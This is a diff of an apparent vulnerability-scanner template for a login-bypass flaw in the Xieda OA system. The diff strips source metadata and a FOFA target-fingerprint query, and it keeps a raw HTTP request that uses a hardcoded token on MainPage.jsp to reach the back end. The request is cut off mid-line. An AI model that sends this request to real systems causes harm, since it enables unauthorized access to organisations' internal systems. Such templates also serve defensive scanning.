@@ -3,12 +3,8 @@ info:
   name: 协达OA系统绕过登录认证登陆后台漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ynq9g042iqd37pwf'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ynq9g042iqd37pwf
-    fofa: body="/interface/CheckLoginName.jsp"
 http:
 - raw:
   - 'GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1
